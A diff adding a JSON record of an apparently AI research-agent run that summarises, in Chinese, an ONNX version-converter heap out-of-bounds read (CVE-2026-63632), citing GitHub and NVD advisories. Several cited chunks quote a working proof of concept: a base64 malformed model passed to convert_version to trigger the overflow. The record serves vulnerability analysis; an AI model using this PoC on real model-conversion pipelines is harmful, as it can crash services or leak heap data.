@@ -1,0 +1,2749 @@
+{
+  "version": "console-historical-receipt-v1",
+  "scope": "public_source_historical_run_not_new_inference",
+  "experiment_id": "agent-stage7-development-v5-tail-20261013",
+  "recorded_at": "2026-10-13T05:47:21.138918+00:00",
+  "source_artifact_sha256": "74f95b2273a1bfb6a92864228e733a3171ca26109b0bd0e1500ce6733177e37e",
+  "known_gap": "onnx-untrusted-model-scope",
+  "data": {
+    "answer": "GitHub 公告的 packages 字段显示，ONNX 的 pip 受影响版本范围为 >= 1.3.0, <= 1.21.0。 [1]\n\nGitHub 公告 packages 字段中 ONNX 的 first_patched_version 为 1.22.0。 [1]\n\nNVD 描述称：从 1.3.0 直到 1.22.0，onnx.version_converter.convert_version() 在 Gemm_7_6::adapt_gemm_7_6() 中可能发生越界读取，该问题在 1.22.0 版本修复。 [2]\n\n触发入口为 onnx.version_converter.convert_version(model, 6)，在 opset 7→6 降级期间触发，与其它公告中的 InferShapes 缺陷不同。 [3]\n\n当 Gemm 节点的输入张量维度少于 2 时，适配器访问 B_shape[1] 而未检查 rank；PoC 的输入 B 形状为 [28]（1 维），B_shape 只有 1 个元素，访问 B_shape[1] 会读取越过 std::vector<Dimension> 内部存储 16 字节进入相邻堆内存。 [3] [4]\n\n同样的未检查模式也适用于第 34、36 行的 A_shape[0] 和 A_shape[1]。 [3]\n\n在 Release 构建上该越界读取是静默的，读取值会传播到转换后模型的输出形状，可能泄露堆数据；在 ASan 构建上被检测为 heap-buffer-overflow，不同堆布局下也可能导致崩溃。 [5]\n\nASan 确认：在 gemm_7_6.h:41 处 heap-buffer-overflow READ of size 16，位于 tensorShapeProtoToDimensions（ir_pb_converter.cc:216）分配的 48 字节区域之后 0 字节处。 [5]\n\n证据边界：本轮片段未包含 NVD 的 packages 或 first_patched_version 同名字段，NVD 版本信息仅来自其描述文本。；结论基于所提供来源片段，未执行 PoC 或复现。",
+    "answer_class": "evidence",
+    "generation": {
+      "status": "completed",
+      "prompt_version": "langgraph-source-team-v4",
+      "answer_contract": "source-answer-v9",
+      "citation_checks_passed": true,
+      "semantic_support_verified": false,
+      "provider": "deepseek",
+      "requested_model": "deepseek-v4-flash",
+      "elapsed_ms": 12974.585,
+      "usage": {
+        "total_tokens": 29912
+      }
+    },
+    "generation_model": "deepseek-v4-flash",
+    "citations": [
+      {
+        "chunk_id": "e4e55de0e4e38673c5ba7293",
+        "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+        "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+        "revision": 1,
+        "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+        "json_pointer": "/1/vulnerabilities",
+        "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+        "field": "packages",
+        "start": 0,
+        "end": 165,
+        "external_id": "GHSA-p893-rvq9-2xf9",
+        "source_id": "github-advisories",
+        "origin": "replay",
+        "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+        "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+        "text": "[{\"first_patched_version\": \"1.22.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"onnx\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.3.0, <= 1.21.0\"}]",
+        "span_provenance": {
+          "version": "source-span-v1",
+          "base_chunk_id": "e4e55de0e4e38673c5ba7293",
+          "base_start": 0,
+          "base_end": 165,
+          "source_field_sha256": "65c126157dc53d9a43d4b0515467de6b1f00a8bf897e73cefafb86ddec3391c2",
+          "source_field_chars": 165,
+          "serialization": "json-sorted-default-v1",
+          "offset_unit": "unicode_codepoint",
+          "selection_kind": "field",
+          "boundary_complete": true,
+          "max_chars": 1200,
+          "contains": null
+        },
+        "original_origin": "live"
+      },
+      {
+        "chunk_id": "6e1faf79a36f22ab1028c508",
+        "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+        "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+        "revision": 1,
+        "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+        "json_pointer": "/vulnerabilities/0/cve/descriptions/0/value",
+        "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+        "field": "description",
+        "start": 0,
+        "end": 525,
+        "external_id": "CVE-2026-63632",
+        "source_id": "nvd",
+        "origin": "replay",
+        "title": "CVE-2026-63632",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+        "text": "Open Neural Network Exchange (ONNX) is an open standard for machine learning interoperability. From 1.3.0 until 1.22.0, onnx.version_converter.convert_version() can perform an out-of-bounds read in Gemm_7_6::adapt_gemm_7_6() in onnx/version_converter/adapters/gemm_7_6.h when a Gemm node has input tensors with fewer than two dimensions because B_shape[1], A_shape[0], or A_shape[1] is accessed without a rank check, potentially causing a process crash during an opset 7 to 6 downgrade. This issue is fixed in version 1.22.0.",
+        "span_provenance": {
+          "version": "source-span-v1",
+          "base_chunk_id": "6e1faf79a36f22ab1028c508",
+          "base_start": 0,
+          "base_end": 525,
+          "source_field_sha256": "8b2957ec5dc456091891f3ab604bd4df7f850c6737c7395fa16e7015c2010394",
+          "source_field_chars": 525,
+          "serialization": "string-verbatim",
+          "offset_unit": "unicode_codepoint",
+          "selection_kind": "field",
+          "boundary_complete": true,
+          "max_chars": 1200,
+          "contains": null
+        },
+        "original_origin": "live"
+      },
+      {
+        "chunk_id": "84dc8e1448a002bd2be53f79",
+        "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+        "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+        "revision": 1,
+        "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+        "json_pointer": "/1/description",
+        "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+        "field": "description",
+        "start": 647,
+        "end": 1717,
+        "external_id": "GHSA-p893-rvq9-2xf9",
+        "source_id": "github-advisories",
+        "origin": "replay",
+        "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+        "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+        "text": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))",
+        "span_provenance": {
+          "version": "source-span-v1",
+          "base_chunk_id": "84dc8e1448a002bd2be53f79",
+          "base_start": 780,
+          "base_end": 1680,
+          "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+          "source_field_chars": 2484,
+          "serialization": "string-verbatim",
+          "offset_unit": "unicode_codepoint",
+          "selection_kind": "sentences",
+          "boundary_complete": true,
+          "max_chars": 1200,
+          "contains": null
+        },
+        "original_origin": "live"
+      },
+      {
+        "chunk_id": "396c2627bdb5e48fa4139bb9",
+        "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+        "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+        "revision": 1,
+        "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+        "json_pointer": "/1/description",
+        "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+        "field": "description",
+        "start": 0,
+        "end": 901,
+        "external_id": "GHSA-p893-rvq9-2xf9",
+        "source_id": "github-advisories",
+        "origin": "replay",
+        "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+        "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+        "text": "### Summary\n\nHeap-buffer-overflow READ (16 bytes) in `Gemm_7_6::adapt_gemm_7_6()` (`onnx/version_converter/adapters/gemm_7_6.h:41`) when `ConvertVersion()` processes a model with a Gemm node whose input tensors have fewer than 2 dimensions. The adapter accesses `B_shape[1]` without checking rank. On Release builds the OOB read is silent; ASan confirms 16-byte read past a 48-byte allocation.\n\n### Details\n\nThe Gemm 7→6 downgrade adapter reads input shapes without bounds checking:\n```cpp\n// gemm_7_6.h:26-42\nconst auto& A_shape = inputs[0]->sizes();  // May have < 2 elements\nconst auto& B_shape = inputs[1]->sizes();  // May have < 2 elements\n\nif (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension).",
+        "span_provenance": {
+          "version": "source-span-v1",
+          "base_chunk_id": "396c2627bdb5e48fa4139bb9",
+          "base_start": 0,
+          "base_end": 900,
+          "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+          "source_field_chars": 2484,
+          "serialization": "string-verbatim",
+          "offset_unit": "unicode_codepoint",
+          "selection_kind": "sentences",
+          "boundary_complete": true,
+          "max_chars": 1200,
+          "contains": null
+        },
+        "original_origin": "live"
+      },
+      {
+        "chunk_id": "f8b8de8ba602a5c6502ed1ea",
+        "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+        "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+        "revision": 1,
+        "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+        "json_pointer": "/1/description",
+        "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+        "field": "description",
+        "start": 1399,
+        "end": 2484,
+        "external_id": "GHSA-p893-rvq9-2xf9",
+        "source_id": "github-advisories",
+        "origin": "replay",
+        "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+        "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+        "text": "poc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))\n\n# Triggers heap-buffer-overflow in Gemm_7_6 adapter\nversion_converter.convert_version(model, 6)\n```\n\n186-byte PoC. ASan confirms: `heap-buffer-overflow READ of size 16` at `gemm_7_6.h:41`, `0 bytes after 48-byte region` allocated in `tensorShapeProtoToDimensions` at `ir_pb_converter.cc:216`.\n\n### Impact\n\nAny application that uses `onnx.version_converter.convert_version()` on untrusted models is vulnerable. This includes model conversion pipelines and tools that auto-downgrade opset versions for compatibility. On Release builds the OOB read is silent — the read value propagates into the converted model's output shape, potentially leaking heap data. On ASan builds it's detected as a heap-buffer-overflow. Could also cause crashes with different heap layouts.",
+        "span_provenance": {
+          "version": "source-span-v1",
+          "base_chunk_id": "f8b8de8ba602a5c6502ed1ea",
+          "base_start": 1560,
+          "base_end": 2460,
+          "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+          "source_field_chars": 2484,
+          "serialization": "string-verbatim",
+          "offset_unit": "unicode_codepoint",
+          "selection_kind": "sentences",
+          "boundary_complete": true,
+          "max_chars": 1200,
+          "contains": null
+        },
+        "original_origin": "live"
+      }
+    ],
+    "generated_claims": [
+      {
+        "text": "GitHub 公告的 packages 字段显示，ONNX 的 pip 受影响版本范围为 >= 1.3.0, <= 1.21.0。",
+        "evidence": [
+          {
+            "citation": 1,
+            "quote": "[{\"first_patched_version\": \"1.22.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"onnx\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.3.0, <= 1.21.0\"}]"
+          }
+        ]
+      },
+      {
+        "text": "GitHub 公告 packages 字段中 ONNX 的 first_patched_version 为 1.22.0。",
+        "evidence": [
+          {
+            "citation": 1,
+            "quote": "[{\"first_patched_version\": \"1.22.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"onnx\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.3.0, <= 1.21.0\"}]"
+          }
+        ]
+      },
+      {
+        "text": "NVD 描述称：从 1.3.0 直到 1.22.0，onnx.version_converter.convert_version() 在 Gemm_7_6::adapt_gemm_7_6() 中可能发生越界读取，该问题在 1.22.0 版本修复。",
+        "evidence": [
+          {
+            "citation": 2,
+            "quote": "Open Neural Network Exchange (ONNX) is an open standard for machine learning interoperability. From 1.3.0 until 1.22.0, onnx.version_converter.convert_version() can perform an out-of-bounds read in Gemm_7_6::adapt_gemm_7_6() in onnx/version_converter/adapters/gemm_7_6.h when a Gemm node has input tensors with fewer than two dimensions because B_shape[1], A_shape[0], or A_shape[1] is accessed without a rank check, potentially causing a process crash during an opset 7 to 6 downgrade. This issue is fixed in version 1.22.0."
+          }
+        ]
+      },
+      {
+        "text": "触发入口为 onnx.version_converter.convert_version(model, 6)，在 opset 7→6 降级期间触发，与其它公告中的 InferShapes 缺陷不同。",
+        "evidence": [
+          {
+            "citation": 3,
+            "quote": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))"
+          }
+        ]
+      },
+      {
+        "text": "当 Gemm 节点的输入张量维度少于 2 时，适配器访问 B_shape[1] 而未检查 rank；PoC 的输入 B 形状为 [28]（1 维），B_shape 只有 1 个元素，访问 B_shape[1] 会读取越过 std::vector<Dimension> 内部存储 16 字节进入相邻堆内存。",
+        "evidence": [
+          {
+            "citation": 4,
+            "quote": "### Summary\n\nHeap-buffer-overflow READ (16 bytes) in `Gemm_7_6::adapt_gemm_7_6()` (`onnx/version_converter/adapters/gemm_7_6.h:41`) when `ConvertVersion()` processes a model with a Gemm node whose input tensors have fewer than 2 dimensions. The adapter accesses `B_shape[1]` without checking rank. On Release builds the OOB read is silent; ASan confirms 16-byte read past a 48-byte allocation.\n\n### Details\n\nThe Gemm 7→6 downgrade adapter reads input shapes without bounds checking:\n```cpp\n// gemm_7_6.h:26-42\nconst auto& A_shape = inputs[0]->sizes();  // May have < 2 elements\nconst auto& B_shape = inputs[1]->sizes();  // May have < 2 elements\n\nif (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension)."
+          },
+          {
+            "citation": 3,
+            "quote": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))"
+          }
+        ]
+      },
+      {
+        "text": "同样的未检查模式也适用于第 34、36 行的 A_shape[0] 和 A_shape[1]。",
+        "evidence": [
+          {
+            "citation": 3,
+            "quote": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))"
+          }
+        ]
+      },
+      {
+        "text": "在 Release 构建上该越界读取是静默的，读取值会传播到转换后模型的输出形状，可能泄露堆数据；在 ASan 构建上被检测为 heap-buffer-overflow，不同堆布局下也可能导致崩溃。",
+        "evidence": [
+          {
+            "citation": 5,
+            "quote": "poc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))\n\n# Triggers heap-buffer-overflow in Gemm_7_6 adapter\nversion_converter.convert_version(model, 6)\n```\n\n186-byte PoC. ASan confirms: `heap-buffer-overflow READ of size 16` at `gemm_7_6.h:41`, `0 bytes after 48-byte region` allocated in `tensorShapeProtoToDimensions` at `ir_pb_converter.cc:216`.\n\n### Impact\n\nAny application that uses `onnx.version_converter.convert_version()` on untrusted models is vulnerable. This includes model conversion pipelines and tools that auto-downgrade opset versions for compatibility. On Release builds the OOB read is silent — the read value propagates into the converted model's output shape, potentially leaking heap data. On ASan builds it's detected as a heap-buffer-overflow. Could also cause crashes with different heap layouts."
+          }
+        ]
+      },
+      {
+        "text": "ASan 确认：在 gemm_7_6.h:41 处 heap-buffer-overflow READ of size 16，位于 tensorShapeProtoToDimensions（ir_pb_converter.cc:216）分配的 48 字节区域之后 0 字节处。",
+        "evidence": [
+          {
+            "citation": 5,
+            "quote": "poc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))\n\n# Triggers heap-buffer-overflow in Gemm_7_6 adapter\nversion_converter.convert_version(model, 6)\n```\n\n186-byte PoC. ASan confirms: `heap-buffer-overflow READ of size 16` at `gemm_7_6.h:41`, `0 bytes after 48-byte region` allocated in `tensorShapeProtoToDimensions` at `ir_pb_converter.cc:216`.\n\n### Impact\n\nAny application that uses `onnx.version_converter.convert_version()` on untrusted models is vulnerable. This includes model conversion pipelines and tools that auto-downgrade opset versions for compatibility. On Release builds the OOB read is silent — the read value propagates into the converted model's output shape, potentially leaking heap data. On ASan builds it's detected as a heap-buffer-overflow. Could also cause crashes with different heap layouts."
+          }
+        ]
+      }
+    ],
+    "claims": [],
+    "tools": [
+      {
+        "tool": "retrieve",
+        "status": "completed",
+        "error": null,
+        "elapsed_ms": 726.694,
+        "input": {
+          "query": "CVE-2026-63632 对照 ONNX 的 GitHub 与 NVD 公告，分别给出原始 pip 范围、首次修复版本及 NVD 的版本措辞。说明触发 API 和 opset 降级路径、输入 rank 条件、未检查的索引、与 InferShapes 问题的边界，并区分 Release 与 ASan 的表现及可能影响，所有结论引用原文，不执行 PoC。",
+          "mode": "hybrid",
+          "limit": 5,
+          "event_id": null
+        },
+        "result_chars": 4221
+      },
+      {
+        "tool": "read_fields",
+        "status": "completed",
+        "error": null,
+        "elapsed_ms": 9.748,
+        "input": {
+          "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+          "fields": [
+            "packages",
+            "description"
+          ],
+          "contains": null,
+          "after_offset": null,
+          "limit": 4
+        },
+        "result_chars": 5949
+      },
+      {
+        "tool": "read_fields",
+        "status": "completed",
+        "error": null,
+        "elapsed_ms": 2.488,
+        "input": {
+          "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+          "fields": [
+            "description"
+          ],
+          "contains": null,
+          "after_offset": null,
+          "limit": 4
+        },
+        "result_chars": 1417
+      }
+    ],
+    "evidence_tasks": [
+      {
+        "task_type": "source_fact_review",
+        "status": "completed",
+        "missing_fields": [],
+        "target_sources": [
+          "github-advisories"
+        ],
+        "completion_conditions": [
+          "从 GitHub 公告中提取 ONNX 的原始 pip 受影响版本范围（packages 字段中的 pip 范围）。"
+        ],
+        "evidence_refs": [
+          {
+            "chunk_id": "e4e55de0e4e38673c5ba7293",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/vulnerabilities",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "packages",
+            "start": 0,
+            "end": 165,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "[{\"first_patched_version\": \"1.22.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"onnx\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.3.0, <= 1.21.0\"}]",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "e4e55de0e4e38673c5ba7293",
+              "base_start": 0,
+              "base_end": 165,
+              "source_field_sha256": "65c126157dc53d9a43d4b0515467de6b1f00a8bf897e73cefafb86ddec3391c2",
+              "source_field_chars": 165,
+              "serialization": "json-sorted-default-v1",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "field",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          }
+        ],
+        "network_verification_status": "not_started"
+      },
+      {
+        "task_type": "source_fact_review",
+        "status": "completed",
+        "missing_fields": [],
+        "target_sources": [
+          "github-advisories"
+        ],
+        "completion_conditions": [
+          "从 GitHub 公告中提取 ONNX 的首次修复版本，以 packages 的 first_patched_version 为准。"
+        ],
+        "evidence_refs": [
+          {
+            "chunk_id": "e4e55de0e4e38673c5ba7293",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/vulnerabilities",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "packages",
+            "start": 0,
+            "end": 165,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "[{\"first_patched_version\": \"1.22.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"onnx\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.3.0, <= 1.21.0\"}]",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "e4e55de0e4e38673c5ba7293",
+              "base_start": 0,
+              "base_end": 165,
+              "source_field_sha256": "65c126157dc53d9a43d4b0515467de6b1f00a8bf897e73cefafb86ddec3391c2",
+              "source_field_chars": 165,
+              "serialization": "json-sorted-default-v1",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "field",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          }
+        ],
+        "network_verification_status": "not_started"
+      },
+      {
+        "task_type": "source_fact_review",
+        "status": "completed",
+        "missing_fields": [],
+        "target_sources": [
+          "nvd"
+        ],
+        "completion_conditions": [
+          "从 NVD 公告的原始描述中提取其对 ONNX 受影响版本的措辞，不要求 NVD 具有 GitHub packages 的同名字段。"
+        ],
+        "evidence_refs": [
+          {
+            "chunk_id": "6e1faf79a36f22ab1028c508",
+            "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+            "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+            "revision": 1,
+            "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+            "json_pointer": "/vulnerabilities/0/cve/descriptions/0/value",
+            "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+            "field": "description",
+            "start": 0,
+            "end": 525,
+            "external_id": "CVE-2026-63632",
+            "source_id": "nvd",
+            "origin": "live",
+            "title": "CVE-2026-63632",
+            "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+            "text": "Open Neural Network Exchange (ONNX) is an open standard for machine learning interoperability. From 1.3.0 until 1.22.0, onnx.version_converter.convert_version() can perform an out-of-bounds read in Gemm_7_6::adapt_gemm_7_6() in onnx/version_converter/adapters/gemm_7_6.h when a Gemm node has input tensors with fewer than two dimensions because B_shape[1], A_shape[0], or A_shape[1] is accessed without a rank check, potentially causing a process crash during an opset 7 to 6 downgrade. This issue is fixed in version 1.22.0.",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "6e1faf79a36f22ab1028c508",
+              "base_start": 0,
+              "base_end": 525,
+              "source_field_sha256": "8b2957ec5dc456091891f3ab604bd4df7f850c6737c7395fa16e7015c2010394",
+              "source_field_chars": 525,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "field",
+              "boundary_complete": true,
+              "max_chars": 1200,
